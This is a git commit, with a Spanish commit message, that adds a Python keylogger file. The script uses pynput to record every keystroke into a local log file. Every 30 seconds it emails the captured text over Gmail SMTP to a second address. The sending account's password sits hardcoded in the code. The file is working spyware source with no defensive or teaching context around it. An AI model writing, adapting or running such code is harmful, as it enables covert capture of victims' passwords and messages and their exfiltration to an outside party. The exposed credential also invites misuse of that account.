c4319ff45c1717909b9c4f12b9c4a8ad17416371
cris <cristianmirandapadilla003@gmail.com>
2025-03-17 01:30:12 -0600

    Subiendo keylogger

---
+++ keylogger.py
@@ -0,0 +1,62 @@
+import smtplib
+import sys
+import logging
+import time
+import datetime
+from pynput import keyboard
+
+# Configuración
+carpeta_destino = "keylog.txt"
+segundos_espera = 30
+timeout = time.time() + segundos_espera
+
+# Configuración de logging para almacenar las teclas
+logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
+
+def TimeOut():
+    return time.time() > timeout
+
+def EnviarEmail():
+    try:
+        with open(carpeta_destino, 'r+') as f:
+            fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            data = f.read()
+            data = data.replace('Space', ' ')
+            data = data.replace('\n', '')
+            mensaje = f'Mensaje capturado a las: {fecha}\n{data}'
+            print(mensaje)
+            
+            # Enviar correo
+            crearEmail('cristianmirandapadilla003@gmail.com', 'floj ixcr dutv ajkh', 'micristian53@gmail.com', f'Nueva captura: {fecha}', mensaje)
+            
+            f.seek(0)
+            f.truncate()
+    except Exception as e:
+        print(f"Error al enviar el correo: {e}")
+
+def crearEmail(user, passw, recep, subj, body):
+    try:
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(user, passw)
+        email = f"From: {user}\nTo: {recep}\nSubject: {subj}\n\n{body}"
+        server.sendmail(user, recep, email)
+        server.quit()
+        print('Correo enviado con éxito!')
+    except Exception as e:
+        print(f"Error al enviar correo: {e}")
+
+def on_press(key):
+    try:
+        logging.info(str(key).replace("'", ""))
+    except Exception as e:
+        print(f"Error al registrar la tecla: {e}")
+
+# Iniciar la escucha del teclado
+listener = keyboard.Listener(on_press=on_press)
+listener.start()
+
+while True:
+    if TimeOut():
+        EnviarEmail()
+        timeout = time.time() + segundos_espera
